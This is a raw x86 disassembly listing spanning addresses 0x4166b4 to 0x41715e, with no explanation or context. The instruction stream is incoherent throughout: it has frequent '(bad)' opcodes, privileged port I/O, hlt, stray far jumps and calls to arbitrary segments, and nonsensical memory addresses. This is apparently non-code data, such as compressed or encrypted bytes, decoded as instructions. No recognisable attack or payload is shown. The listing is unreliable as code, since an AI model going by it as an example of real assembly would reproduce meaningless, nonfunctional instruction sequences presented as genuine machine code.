  4166b4:	cmp    cl,cl
  4166b6:	mov    ds:0x9f279e74,eax
  4166bb:	(bad)  
  4166be:	jns    0x416730
  4166c0:	jb     0x416716
  4166c2:	cmp    eax,0xa43db2fd
  4166c7:	mov    DWORD PTR [ebp-0x43ffead4],eax
  4166cd:	das    
  4166ce:	mov    ds:0x34aa301b,al
  4166d4:	or     al,dh
  4166d6:	mov    eax,ds:0x71e20f41
  4166db:	adc    BYTE PTR [esi+0x69],ah
  4166de:	inc    esp
  4166df:	xchg   ebx,eax
  4166e0:	jle    0x41672b
  4166e2:	sbb    ebx,edx
  4166e4:	add    BYTE PTR [ebp-0x3d],bh
  4166e7:	mov    eax,ds:0x23435a7e
  4166ec:	(bad)  
  4166ee:	data16 cmc 
  4166f0:	loopne 0x4166c2
  4166f2:	mov    ebp,0x5f6f871c
  4166f7:	in     al,dx
  4166f8:	lds    ebx,FWORD PTR [ebp+0x1e0f79f]
  4166fe:	jmp    0x4166b1
  416700:	lahf   
  416701:	pop    ds
  416702:	xchg   esp,eax
  416703:	hlt    
  416704:	xlat   BYTE PTR ds:[ebx]
  416705:	add    eax,ebx
  416707:	jmp    0x5610:0x27573f7
  41670e:	js     0x41671c
  416710:	push   ss
  416711:	aas    
  416712:	xor    bl,BYTE PTR ds:0xdbae1559
  416718:	mov    ds:0xe5f9ea74,al
  41671d:	loopne 0x41675f
  41671f:	push   esp
  416720:	leave  
  416721:	aas    
  416722:	test   al,0x6f
  416724:	add    ebx,DWORD PTR [eax]
  416726:	cs loopne 0x4166f2
  416729:	cmp    bh,bh
  41672b:	aad    0xf2
  41672d:	mov    DWORD PTR [eax-0x52],ebp
  416730:	icebp  
  416731:	in     eax,0xca
  416733:	retf   0xd17f
  416736:	or     ecx,ebx
  416738:	adc    al,0x17
  41673a:	fild   QWORD PTR [ebx]
  41673c:	cs push ds
  41673e:	das    
  41673f:	jns    0x4166dd
	...
  4167b1:	add    BYTE PTR [eax],al
  4167b3:	add    bl,cl
  4167b5:	(bad)  
  4167b6:	xchg   ebx,eax
  4167b7:	in     al,dx
  4167b8:	mov    bh,0xed
  4167ba:	(bad)  
  4167bb:	push   DWORD PTR [ecx+0x19]
  4167be:	comiss xmm4,DWORD PTR [eax-0x2e71225f]
  4167c5:	cmc    
  4167c6:	add    BYTE PTR [eax],al
  4167c8:	cmc    
  4167c9:	add    BYTE PTR [eax],al
  4167cb:	add    BYTE PTR [esi-0x44d48912],dh
  4167d1:	call   0xf6ac:0x40a67f62
  4167d8:	test   edi,edi
  4167da:	cmp    ch,BYTE PTR ds:0xd715ef1b
  4167e0:	ret    0xa526
  4167e3:	mov    dl,0x39
  4167e5:	mov    WORD PTR [eax+ecx*1+0x7e],?
  4167e9:	mov    ebx,0xad2753c5
  4167ee:	xchg   esi,eax
  4167ef:	sub    BYTE PTR [esi],bh
  4167f1:	fidiv  DWORD PTR [ecx]
  4167f3:	inc    bh
  4167f5:	rcl    BYTE PTR [esi-0x5a220cd8],1
  4167fb:	(bad)  
  4167fd:	adc    ecx,DWORD PTR [esi-0x28]
  416800:	(bad)  
  416801:	xor    ch,BYTE PTR [ebp+edx*2-0x24]
  416805:	outs   dx,BYTE PTR ds:[esi]
  416806:	inc    eax
  416807:	(bad)  
  416809:	out    0xf1,eax
  41680b:	xor    eax,0x9f8b79df
  416810:	cmp    al,0x4a
  416812:	sub    eax,0xe22449b8
  416817:	scas   eax,DWORD PTR es:[edi]
  416818:	aad    0x40
  41681a:	aad    0x2b
  41681c:	inc    edi
  41681d:	xchg   ebp,eax
  41681e:	aad    0xa9
  416820:	sbb    eax,0x2887ca13
  416825:	and    bh,BYTE PTR [esi-0x37]
  416828:	jb     0x41684a
  41682a:	xchg   edi,eax
  41682b:	lds    eax,FWORD PTR [esi+0x52]
  41682e:	xor    ecx,DWORD PTR [eax+0x30]
  416831:	push   ecx
  416832:	xchg   ebx,eax
  416833:	dec    ebx
  416834:	aad    0x6e
  416836:	sti    
  416837:	pusha  
  416838:	push   ebp
  416839:	(bad)  
  41683a:	out    dx,al
  41683b:	into   
  41683c:	mov    ebx,0x9eb0bc7f
  416841:	jbe    0x41689a
  416843:	mov    edx,DWORD PTR [edi+esi*4-0x11]
  416847:	popa   
  416848:	jle    0x41681a
  41684a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41684b:	call   0xc248:0x53aefce2
  416852:	test   eax,0x229af991
  416857:	scas   eax,DWORD PTR es:[edi]
  416858:	sbb    BYTE PTR [esi-0x3d],al
  41685b:	jl     0x4168a1
  41685d:	cmp    al,ch
  41685f:	cmp    BYTE PTR [ebx],ah
  416861:	(bad)  
  416862:	cmp    al,0xfc
  416864:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416865:	push   ecx
  416866:	push   esp
  416867:	pop    ebx
  416868:	mov    ch,0x66
  41686a:	pop    ds
  41686b:	stc    
  41686c:	pop    eax
  41686d:	pop    edx
  41686e:	gs jp  0x416854
  416871:	push   ss
  416872:	sub    DWORD PTR [edi],ecx
  416874:	or     eax,DWORD PTR [ecx-0x3cea4385]
  41687a:	sub    dh,BYTE PTR [ebx+esi*1+0x1d61903c]
  416881:	push   edx
  416882:	popf   
  416883:	out    0x74,al
  416885:	cli    
  416886:	fs fwait
  416888:	cwde   
  416889:	xor    DWORD PTR [ebx],edx
  41688b:	mov    ds:0xcd0f6e41,al
  416890:	adc    al,0x6a
  416892:	enter  0x2abe,0x16
  416896:	in     eax,0xd6
  416898:	into   
  416899:	push   esi
  41689a:	add    ah,BYTE PTR [esp+edx*1]
  41689d:	mov    edx,0xd1bc80d0
  4168a2:	ins    DWORD PTR es:[edi],dx
  4168a3:	mov    ch,0xb9
  4168a5:	mov    es,WORD PTR [edi+0x70893218]
  4168ab:	dec    ecx
  4168ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4168ad:	mov    al,0x65
  4168af:	lods   eax,DWORD PTR ds:[esi]
  4168b0:	test   eax,0x75c0d2ce
  4168b5:	sbb    eax,ebx
  4168b7:	push   ecx
  4168b8:	cmp    ebx,DWORD PTR [edx+0x12e65f7d]
  4168be:	sbb    eax,0x46fb
	...
  416933:	add    BYTE PTR [ebp-0x78],al
  416936:	sub    al,0x77
  416938:	in     eax,dx
  416939:	neg    DWORD PTR [edi-0x46]
  41693c:	push   eax
  41693d:	inc    ebp
  41693e:	push   ss
  41693f:	xor    DWORD PTR [ecx+esi*2-0x35],edi
  416943:	sub    eax,esi
  416945:	test   BYTE PTR [eax],0x0
  416948:	cmc    
  416949:	add    BYTE PTR [eax],al
  41694b:	add    ah,bh
  41694d:	out    0xe,eax
  41694f:	jmp    0xdeac:0x89093e40
  416956:	fmulp  st(5),st
  416958:	dec    DWORD PTR [eax]
  41695a:	std    
  41695b:	jo     0x416922
  41695d:	ret    
  41695e:	or     DWORD PTR [esi],edx
  416960:	pop    ecx
  416961:	jge    0x4169cc
  416963:	mov    ds,WORD PTR [eax-0x4cb7ce4a]
  416969:	or     BYTE PTR [edx+0x6f],0x85
  41696d:	jge    0x416921
  41696f:	in     eax,dx
  416970:	outs   dx,BYTE PTR ds:[esi]
  416971:	imul   esi,DWORD PTR [esi-0x65],0xffffffe6
  416975:	mov    edx,0x1c2a0814
  41697a:	add    esi,DWORD PTR [esp+edi*2+0x50b05be1]
  416981:	arpl   cx,si
  416983:	daa    
  416984:	aaa    
  416985:	xchg   DWORD PTR [eax+eax*4],ecx
  416988:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416989:	outs   dx,DWORD PTR ds:[esi]
  41698a:	shl    ebp,0xeb
  41698d:	push   ebx
  41698e:	push   edx
  41698f:	or     DWORD PTR [ebx-0x63],ebp
  416992:	push   ss
  416993:	mov    bh,0x7a
  416995:	add    bl,BYTE PTR [esi+0x43905efc]
  41699b:	xchg   BYTE PTR [ebx],dl
  41699d:	pop    eax
  41699e:	pop    ds
  41699f:	imul   ebx,edi,0x84cd6a48
  4169a5:	fwait
  4169a6:	jo     0x416995
  4169a8:	imul   ebp,DWORD PTR [ebx+ebp*1+0x6a],0x11
  4169ad:	loopne 0x416939
  4169af:	mov    esi,0xb79891b4
  4169b4:	mov    BYTE PTR [ebx],0xdb
  4169b7:	adc    ecx,DWORD PTR [edx]
  4169b9:	and    eax,0xb0726c63
  4169be:	outs   dx,DWORD PTR ds:[esi]
  4169bf:	(bad)  
  4169c0:	scas   eax,DWORD PTR es:[edi]
  4169c1:	rcpps  xmm0,XMMWORD PTR [esi]
  4169c4:	and    al,0xa2
  4169c6:	loopne 0x4169ae
  4169c8:	leave  
  4169c9:	stos   BYTE PTR es:[edi],al
  4169ca:	retf   0xe365
  4169cd:	or     DWORD PTR [ebx],0xd8c4ddb5
  4169d3:	sbb    al,0xf8
  4169d5:	or     edx,DWORD PTR [ebx]
  4169d7:	enter  0x833c,0x2c
  4169db:	mov    al,0xfc
  4169dd:	adc    dh,BYTE PTR [ebx+0x115410d7]
  4169e3:	jle    0x416a19
  4169e5:	ret    0xc834
  4169e8:	dec    edx
  4169e9:	fwait
  4169ea:	or     dh,al
  4169ec:	repz fistp WORD PTR [ecx-0x7]
  4169f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4169f1:	sbb    DWORD PTR [ecx+0x4c92da56],ebx
  4169f7:	mov    ch,0x4e
  4169f9:	pop    ebx
  4169fa:	or     eax,0x520abd60
  4169ff:	rol    BYTE PTR [ebx-0x3234c54a],0xb8
  416a06:	stos   BYTE PTR es:[edi],al
  416a07:	xlat   BYTE PTR ds:[ebx]
  416a08:	nop
  416a09:	shl    BYTE PTR [ecx],0x70
  416a0c:	push   ss
  416a0d:	mov    ch,0x3c
  416a0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a10:	cs call 0xb71:0x16584470
  416a18:	fdivp  st(2),st
  416a1a:	pop    edx
  416a1b:	xor    DWORD PTR [eax+0x5c],0xe8bbda7
  416a22:	xchg   edi,eax
  416a23:	retf   
  416a24:	ins    BYTE PTR es:[edi],dx
  416a25:	popf   
  416a26:	sbb    eax,0x267a17d
  416a2b:	add    BYTE PTR [esi-0x33],0xa9
  416a2f:	xchg   DWORD PTR [eax-0x7d],esp
  416a32:	dec    ecx
  416a33:	xchg   BYTE PTR [esp+ebp*2+0x52],cl
  416a37:	pop    edx
  416a38:	int    0xa9
  416a3a:	shl    BYTE PTR [edi-0x7d3cc010],0x21
	...
  416ab1:	add    BYTE PTR [eax],al
  416ab3:	add    bh,bl
  416ab5:	mov    esi,0xbb659205
  416aba:	(bad)  
  416abc:	nop
  416abd:	fmul   QWORD PTR [ebx+0x23ef6552]
  416ac3:	out    0xbb,al
  416ac5:	test   DWORD PTR [eax],0xf500
  416acb:	add    cl,al
  416acd:	jmp    0x228c:0x34e8eded
  416ad4:	sbb    bl,BYTE PTR [edi+0x5e85f7f1]
  416ada:	sahf   
  416adb:	aad    0x84
  416add:	jmp    0xec78:0xb5e14f4c
  416ae4:	push   ss
  416ae5:	out    dx,eax
  416ae6:	stos   DWORD PTR es:[edi],eax
  416ae7:	je     0x416a75
  416ae9:	loope  0x416b45
  416aeb:	aaa    
  416aec:	je     0x416ae1
  416aee:	mov    ds:0x2990e621,eax
  416af3:	push   es
  416af4:	inc    esi
  416af5:	jl     0x416b31
  416af7:	inc    esp
  416af8:	sub    BYTE PTR [esi],bl
  416afa:	push   edi
  416afb:	mov    dl,0x8d
  416afd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416afe:	leave  
  416aff:	jecxz  0x416b60
  416b01:	add    esp,0xffffffc3
  416b04:	xor    bh,BYTE PTR [edi]
  416b06:	xor    al,0xc4
  416b08:	nop
  416b09:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b0b:	bound  ebx,QWORD PTR ds:0x49f6d53f
  416b11:	jnp    0x416add
  416b13:	popf   
  416b14:	add    eax,0x56a146bb
  416b19:	je     0x416abf
  416b1b:	sar    DWORD PTR [ecx-0x17],cl
  416b1e:	or     ebp,DWORD PTR [ebx+0x2f]
  416b21:	jbe    0x416af8
  416b23:	push   edx
  416b24:	xor    eax,0xdf8b4806
  416b29:	ds push ebx
  416b2b:	and    ch,BYTE PTR [ebx]
  416b2d:	inc    ebp
  416b2e:	gs pop ebp
  416b30:	mov    ebx,DWORD PTR [ebp-0x53]
  416b33:	xchg   edi,eax
  416b34:	ret    
  416b35:	xchg   esp,eax
  416b36:	dec    edi
  416b37:	icebp  
  416b38:	xor    al,0x7e
  416b3a:	push   ecx
  416b3b:	mov    esi,0xb360b199
  416b40:	fnsave [eax+0x71]
  416b43:	and    cl,BYTE PTR [ebp+eax*2+0x15]
  416b47:	(bad)  
  416b48:	neg    DWORD PTR [eax+0x24c38061]
  416b4e:	pop    edi
  416b4f:	mov    WORD PTR [ecx-0x11],ss
  416b52:	xor    DWORD PTR [edi-0x76936748],eax
  416b58:	push   ebp
  416b59:	mov    eax,0xb749cd48
  416b5e:	jne    0x416bcd
  416b60:	or     eax,0xee0aa208
  416b65:	mov    DWORD PTR [esi-0x48],edi
  416b68:	push   edi
  416b69:	dec    esp
  416b6a:	fsubr  DWORD PTR [ecx]
  416b6c:	xchg   esi,eax
  416b6d:	jnp    0x416b72
  416b6f:	jge    0x416b2f
  416b71:	jo     0x416b27
  416b73:	je     0x416bea
  416b75:	in     eax,0x6d
  416b77:	push   ecx
  416b78:	or     al,0xdb
  416b7a:	pop    eax
  416b7b:	sbb    al,cl
  416b7d:	(bad)  
  416b7e:	ss pop ss
  416b80:	mov    ah,0xe5
  416b82:	cld    
  416b83:	xor    BYTE PTR [ecx],dh
  416b85:	mov    ch,BYTE PTR [ebx]
  416b87:	inc    edx
  416b88:	push   es
  416b89:	inc    edx
  416b8a:	mov    ebp,edi
  416b8c:	das    
  416b8d:	iret   
  416b8e:	jns    0x416b1d
  416b90:	mov    esp,0x19ce6427
  416b95:	retf   0x3345
  416b98:	xor    eax,0x48c44046
  416b9d:	sub    ecx,DWORD PTR [ecx+eax*2+0x3b]
  416ba1:	clc    
  416ba2:	mov    DWORD PTR [ebp-0x72],ebp
  416ba5:	xor    al,0x36
  416ba7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416ba8:	pop    ds
  416ba9:	adc    DWORD PTR [ecx-0xf],eax
  416bac:	aad    0x31
  416bae:	fst    QWORD PTR [esi+edi*4+0x1053ecab]
  416bb5:	mov    DWORD PTR [eax],ecx
  416bb7:	push   edi
  416bb8:	or     edx,eax
  416bba:	sbb    DWORD PTR [edx],edi
  416bbc:	push   ecx
  416bbd:	and    al,0x6a
  416bbf:	pop    esp
  416bc0:	loope  0x416bc2
	...
  416c32:	add    BYTE PTR [eax],al
  416c34:	cmp    dl,BYTE PTR [eax]
  416c36:	mov    edi,0xbbbfbf3c
  416c3b:	push   ss
  416c3c:	add    ebx,DWORD PTR [eax-0x29]
  416c3f:	adc    edx,DWORD PTR [ebx-0x49]
  416c42:	xor    bl,BYTE PTR [eax-0x50]
  416c45:	clc    
  416c46:	add    BYTE PTR [eax],al
  416c48:	cmc    
  416c49:	add    BYTE PTR [eax],al
  416c4b:	add    BYTE PTR [ebx],dh
  416c4d:	fidivr DWORD PTR [eax+esi*4]
  416c50:	popa   
  416c51:	dec    esp
  416c52:	out    dx,eax
  416c53:	ja     0x416c8c
  416c55:	(bad)  
  416c56:	icebp  
  416c57:	imul   ebp,DWORD PTR [eax+0x3e],0x66b4097c
  416c5e:	jmp    0x416cc7
  416c60:	inc    ebp
  416c61:	and    dh,al
  416c63:	and    esp,DWORD PTR [eax-0x16c6e8bc]
  416c69:	push   ss
  416c6a:	jb     0x416c14
  416c6c:	mov    ah,0xa0
  416c6e:	mov    eax,ds:0x378e489c
  416c73:	add    BYTE PTR [edx-0x3a],dl
  416c76:	sbb    DWORD PTR [ebx],0xd02eeed8
  416c7c:	add    BYTE PTR [edi-0x583432a5],ch
  416c82:	imul   BYTE PTR [edx]
  416c84:	sbb    dl,BYTE PTR [eax-0x45]
  416c87:	push   ebp
  416c88:	cs out dx,eax
  416c8a:	test   eax,0xb9fc8dff
  416c8f:	sbb    al,0xda
  416c91:	call   0x96c3:0xc8ef175b
  416c98:	scas   eax,DWORD PTR es:[edi]
  416c99:	int3   
  416c9a:	pop    edi
  416c9b:	popa   
  416c9c:	xor    BYTE PTR [ebx+0x24],dh
  416c9f:	cmp    al,0x52
  416ca1:	int    0x9
  416ca3:	mov    esp,0x4109e27
  416ca8:	mov    DWORD PTR [eax-0x3f],esi
  416cab:	jne    0x416c50
  416cad:	mov    esp,0x2720e694
  416cb2:	sub    al,0xeb
  416cb4:	imul   edx,DWORD PTR [ebx-0x638f17a3],0x33
  416cbb:	add    dh,BYTE PTR [edi-0x3bd518a3]
  416cc1:	add    ecx,ecx
  416cc3:	jb     0x416ca3
  416cc5:	shl    ah,0x63
  416cc8:	inc    eax
  416cc9:	pusha  
  416cca:	pop    ss
  416ccb:	(bad)  
  416ccc:	in     al,dx
  416ccd:	test   ebx,esi
  416ccf:	js     0x416d06
  416cd1:	(bad)  
  416cd2:	das    
  416cd3:	mov    ah,BYTE PTR [esi]
  416cd5:	xchg   esp,esp
  416cd7:	mov    edi,0x9c425d33
  416cdc:	push   ds
  416cdd:	aam    0x34
  416cdf:	test   eax,0x4174d10a
  416ce4:	or     BYTE PTR [ebx+0x15b12bd5],0x9b
  416ceb:	dec    ch
  416ced:	and    eax,DWORD PTR ds:0x58a652df
  416cf3:	mov    esi,DWORD PTR [edi]
  416cf5:	xor    edi,ecx
  416cf7:	rcr    bh,0xed
  416cfa:	sar    DWORD PTR [si],cl
  416cfd:	push   0xfffffffa
  416cff:	xor    esp,ebp
  416d01:	push   ebp
  416d02:	ins    DWORD PTR es:[edi],dx
  416d03:	adc    ah,al
  416d05:	push   eax
  416d06:	cmp    BYTE PTR [ebx],ah
  416d08:	in     eax,dx
  416d09:	ffree  st(0)
  416d0b:	bnd js 0x416cec
  416d0e:	adc    al,0x6f
  416d10:	repnz sub al,0x2f
  416d13:	fwait
  416d14:	inc    BYTE PTR [edi+0x56]
  416d17:	fisub  WORD PTR [esi+0x2]
  416d1a:	ret    
  416d1b:	xchg   esp,eax
  416d1c:	mov    edi,0xc0df92cf
  416d21:	jp     0x416cc3
  416d23:	ret    0x98c5
  416d26:	xlat   BYTE PTR ds:[ebx]
  416d27:	xor    BYTE PTR [edx-0x3b40a504],cl
  416d2d:	std    
  416d2e:	xchg   esi,eax
  416d2f:	inc    esp
  416d30:	stos   BYTE PTR es:[edi],al
  416d31:	stos   BYTE PTR es:[edi],al
  416d32:	hlt    
  416d33:	ja     0x416d7f
  416d35:	mov    eax,0xa0b2633
  416d3a:	stos   DWORD PTR es:[edi],eax
  416d3b:	sbb    bl,BYTE PTR [eax-0x4867d784]
	...
  416db1:	add    BYTE PTR [eax],al
  416db3:	add    dh,ch
  416db5:	repnz cmc 
  416db7:	add    edi,ebp
  416db9:	pop    es
  416dba:	(bad)  
  416dbb:	inc    edx
  416dbd:	xchg   ebx,eax
  416dbe:	pusha  
  416dbf:	push   0xb479bdac
  416dc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416dc5:	stc    
  416dc6:	add    BYTE PTR [eax],al
  416dc8:	cmc    
  416dc9:	add    BYTE PTR [eax],al
  416dcb:	add    BYTE PTR [ebp-0x42a0957d],dl
  416dd1:	lahf   
  416dd2:	test   al,0xdd
  416dd4:	into   
  416dd5:	push   ebp
  416dd6:	jne    0x416d8c
  416dd8:	fwait
  416dd9:	add    eax,0xe6260300
  416dde:	and    eax,0x943c726b
  416de3:	mov    dh,0x3c
  416de5:	shr    DWORD PTR [edi+0x2c51af2],cl
  416deb:	jge    0x416d8b
  416ded:	and    BYTE PTR [esi],ch
  416def:	mov    esi,0x811486b6
  416df4:	loopne 0x416dc9
  416df6:	pop    eax
  416df7:	xor    al,BYTE PTR [esi-0x7d951028]
  416dfd:	cwde   
  416dfe:	cwde   
  416dff:	inc    esp
  416e00:	cdq    
  416e01:	call   0xc7bfc293
  416e06:	sub    BYTE PTR [edi+0x246400c3],bl
  416e0c:	fcmovnu st,st(1)
  416e0e:	or     eax,0x48219386
  416e13:	jg     0x416e8c
  416e15:	(bad)  
  416e16:	pop    ds
  416e17:	jle    0x416e3e
  416e19:	lea    edi,[ebx-0x50]
  416e1c:	or     edx,DWORD PTR [edx+ebp*4-0x1c3c539d]
  416e23:	mov    esp,0xbc863976
  416e28:	mov    dh,0x2a
  416e2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e2b:	cmp    edx,DWORD PTR [eax]
  416e2d:	or     DWORD PTR [ebp+ebx*4-0x2ecd3b2],edx
  416e34:	popa   
  416e35:	sub    edx,DWORD PTR [esi+0x6c593400]
  416e3b:	aad    0x8d
  416e3d:	hlt    
  416e3e:	aad    0xfa
  416e40:	add    eax,0x842da8a4
  416e45:	fs xchg edx,eax
  416e47:	(bad)  
  416e48:	ja     0x416de3
  416e4a:	sti    
  416e4b:	lods   eax,DWORD PTR ds:[esi]
  416e4c:	mov    DWORD PTR [ebx+0x2b],ecx
  416e4f:	xchg   esi,eax
  416e50:	xor    ch,BYTE PTR [edx-0x4301c4c1]
  416e56:	lods   al,BYTE PTR ds:[esi]
  416e57:	adc    DWORD PTR [edx+0x30b75edd],ebx
  416e5d:	lea    esi,[ecx-0x6f929ea2]
  416e63:	in     al,dx
  416e64:	out    dx,eax
  416e65:	(bad)  
  416e66:	adc    BYTE PTR [edi],dl
  416e68:	ss jmp 0xc1b7:0xb0d81266
  416e70:	or     eax,ebp
  416e72:	pop    ss
  416e73:	psubq  mm3,QWORD PTR [eax-0x47]
  416e77:	rol    DWORD PTR [edi-0x48a453b],cl
  416e7d:	xchg   edi,eax
  416e7e:	vpsubd ymm4,ymm4,YMMWORD PTR [eax+0x52]
  416e83:	pop    ss
  416e84:	cdq    
  416e85:	xor    al,0xcc
  416e87:	imul   ecx,ebx,0xf792505b
  416e8d:	xchg   ecx,eax
  416e8e:	xchg   ah,cl
  416e90:	or     ch,BYTE PTR [ecx]
  416e92:	ds leave 
  416e94:	sub    al,0x80
  416e96:	cmp    eax,0x50b8
  416e9b:	icebp  
  416e9c:	sbb    eax,edi
  416e9e:	jbe    0x416f03
  416ea0:	xchg   ebx,eax
  416ea1:	(bad)  
  416ea2:	fcom   QWORD PTR [edi+edi*2]
  416ea5:	fsubr  st(1),st
  416ea7:	mov    al,BYTE PTR ds:0x1378d625
  416ead:	jp     0x416f02
  416eaf:	jg     0x416ebc
  416eb1:	fs cmp edi,ebp
  416eb4:	inc    esp
  416eb5:	test   BYTE PTR [ebx-0x52],ah
  416eb8:	lea    edi,[ebx+0x68]
  416ebb:	aad    0xe7
  416ebd:	ret    
  416ebe:	dec    ebx
  416ebf:	inc    esp
  416ec0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
	...
  416f31:	add    BYTE PTR [eax],al
  416f33:	add    BYTE PTR [edi],dl
  416f35:	mov    BYTE PTR [esi-0x6e],ch
  416f38:	push   esi
  416f3a:	dec    DWORD PTR [ebp-0x2a075371]
  416f40:	push   esi
  416f41:	(bad)  
  416f42:	retf   0x9adc
  416f45:	cli    
  416f46:	add    BYTE PTR [eax],al
  416f48:	cmc    
  416f49:	add    BYTE PTR [eax],al
  416f4b:	add    BYTE PTR [ebx-0x3a],dh
  416f4e:	push   esi
  416f4f:	ja     0x416f6e
  416f51:	and    DWORD PTR [eax-0x61fcb1d4],eax
  416f57:	(bad)  
  416f58:	popf   
  416f59:	pop    edi
  416f5a:	mov    ecx,0x18a8a6c8
  416f5f:	xor    bh,BYTE PTR [ebp+0x53ed4925]
  416f65:	cli    
  416f66:	ins    BYTE PTR es:[edi],dx
  416f67:	jno    0x416fd9
  416f69:	xor    dl,BYTE PTR [edi*1+0x17122ee0]
  416f70:	mov    WORD PTR [ecx-0x61451f88],ss
  416f76:	je     0x416f43
  416f78:	pushf  
  416f79:	push   ss
  416f7a:	dec    esp
  416f7b:	mov    bl,0x97
  416f7d:	inc    ecx
  416f7e:	lds    edi,FWORD PTR [ebp-0x49]
  416f81:	inc    edi
  416f82:	mov    edi,0x9d5e30bd
  416f87:	cmp    al,0x3c
  416f89:	adc    eax,0xf62d014e
  416f8e:	fbstp  TBYTE PTR [ecx-0x31]
  416f91:	dec    esi
  416f92:	add    cl,0xef
  416f95:	add    eax,0xa7e2e9b2
  416f9a:	dec    eax
  416f9b:	out    0x22,al
  416f9d:	test   bl,ch
  416f9f:	sub    DWORD PTR [esi],ebp
  416fa1:	loopne 0x417006
  416fa3:	and    eax,0x49a4e7a4
  416fa8:	jmp    0x416f41
  416faa:	dec    ebx
  416fab:	pop    ebp
  416fac:	nop
  416fad:	lock mov eax,ds:0x51393fef
  416fb3:	sbb    edx,DWORD PTR [ebx]
  416fb5:	xchg   esi,eax
  416fb6:	inc    eax
  416fb7:	test   al,0x3
  416fb9:	xchg   BYTE PTR [edx+ebp*2-0x2b782baf],bl
  416fc0:	arpl   di,ax
  416fc2:	jae    0x416ffb
  416fc4:	fwait
  416fc5:	push   ecx
  416fc6:	push   0x15
  416fc8:	mov    bh,0x29
  416fca:	lahf   
  416fcb:	cmp    al,BYTE PTR [edi+0x69]
  416fce:	shr    BYTE PTR [esi-0x8],1
  416fd1:	inc    esp
  416fd2:	add    BYTE PTR cs:[edx+0x74444c84],al
  416fd9:	cwde   
  416fda:	xchg   edi,eax
  416fdb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416fdc:	mov    DWORD PTR [esi+0x3ca4738f],esp
  416fe2:	fld    DWORD PTR [edx]
  416fe4:	pushf  
  416fe5:	xchg   BYTE PTR fs:[ebp-0x6c],ah
  416fe9:	lods   eax,DWORD PTR ds:[esi]
  416fea:	jl     0x417047
  416fec:	jbe    0x416f87
  416fee:	cmp    cl,dl
  416ff0:	out    0x6e,eax
  416ff2:	xor    eax,0x1b68d1ed
  416ff7:	jne    0x416fba
  416ff9:	mov    cl,0x18
  416ffb:	add    BYTE PTR [edx+0x19],cl
  416ffe:	mov    eax,ds:0x3f1e0595
  417003:	rcl    DWORD PTR [ebp-0x4],1
  417006:	xor    al,0xe
  417008:	aas    
  417009:	nop
  41700a:	jae    0x416f90
  41700c:	push   ds
  41700d:	addr16 in eax,0xfb
  417010:	cmc    
  417011:	ins    BYTE PTR es:[edi],dx
  417012:	aas    
  417013:	mov    WORD PTR [eax+0x46],es
  417016:	aam    0xcf
  417018:	push   ss
  417019:	jbe    0x417099
  41701b:	popa   
  41701c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41701d:	lds    ebp,FWORD PTR [edx]
  41701f:	push   ss
  417020:	loop   0x416fbb
  417022:	repz inc ecx
  417024:	adc    bh,al
  417026:	mov    edx,DWORD PTR [esi+0x2b9c6f4e]
  41702c:	lds    eax,FWORD PTR [ebp-0x27]
  41702f:	iret   
  417030:	inc    eax
  417031:	aaa    
  417032:	ins    DWORD PTR es:[edi],dx
  417033:	and    DWORD PTR [esi-0x30dea8de],eax
  417039:	jmp    0x935b:0xd9c0d1ce
  417040:	pop    esp
	...
  4170b1:	add    BYTE PTR [eax],al
  4170b3:	add    BYTE PTR [eax],ah
  4170b5:	jmp    0xdf3d4ef5
  4170ba:	in     eax,0xff
  4170bc:	dec    ecx
  4170bd:	dec    ecx
  4170be:	ret    
  4170bf:	or     DWORD PTR [edx-0x705535f9],0xfffffffb
  4170c6:	add    BYTE PTR [eax],al
  4170c8:	cmc    
  4170c9:	add    BYTE PTR [eax],al
  4170cb:	add    BYTE PTR [edi-0x1f],bh
  4170ce:	push   esi
  4170cf:	cs push cs
  4170d1:	mov    edx,0xdfd03899
  4170d6:	in     al,0x7c
  4170d8:	add    eax,0x6b22dd9b
  4170dd:	loop   0x417072
  4170df:	lds    eax,FWORD PTR [esi+0x3f56a461]
  4170e5:	retf   0x396e
  4170e8:	popa   
  4170e9:	arpl   si,ax
  4170eb:	adc    DWORD PTR [edx],eax
  4170ed:	pop    ds
  4170ee:	nop
  4170ef:	sti    
  4170f0:	int    0xb2
  4170f2:	add    DWORD PTR [ebx],ecx
  4170f4:	shl    BYTE PTR cs:[ebx-0x58993943],cl
  4170fb:	daa    
  4170fc:	rcr    BYTE PTR [esi+eiz*1],1
  4170ff:	in     eax,dx
  417100:	cdq    
  417101:	push   edx
  417102:	es jl  0x417175
  417105:	loop   0x417111
  417107:	xor    DWORD PTR [ebp-0x20ea7c9b],edx
  41710d:	inc    esi
  41710e:	mov    ds,WORD PTR [eax-0x7b]
  417111:	sub    ebx,0xabaf2a1b
  417117:	inc    edi
  417118:	hlt    
  417119:	aaa    
  41711a:	mov    bl,0xe4
  41711c:	and    ecx,DWORD PTR [edx+0x2f95295b]
  417122:	int    0xa9
  417124:	adc    ebx,eax
  417126:	pusha  
  417127:	jg     0x4170c6
  417129:	sub    ch,BYTE PTR [eax]
  41712b:	push   esp
  41712c:	aad    0x60
  41712e:	lock jb 0x4170d1
  417131:	mov    dh,0x9
  417133:	retf   0xf3e2
  417136:	test   eax,0xa3ba2df6
  41713b:	jae    0x41712b
  41713d:	jo     0x417175
  41713f:	lahf   
  417140:	mov    esp,0xceaf1236
  417145:	xchg   esi,eax
  417146:	out    dx,eax
  417147:	lahf   
  417148:	shl    BYTE PTR [ebx+0x57],cl
  41714b:	xor    ecx,ebp
  41714d:	mov    al,0x7d
  41714f:	sbb    bl,BYTE PTR [edx-0x72]
  417152:	mov    al,ds:0xf498b2f2
  417157:	cmp    BYTE PTR [ebx],al
  417159:	dec    esi
  41715a:	sahf   
  41715b:	sbb    cl,BYTE PTR [ebp+0x72]
  41715e:	sub    al,0x34
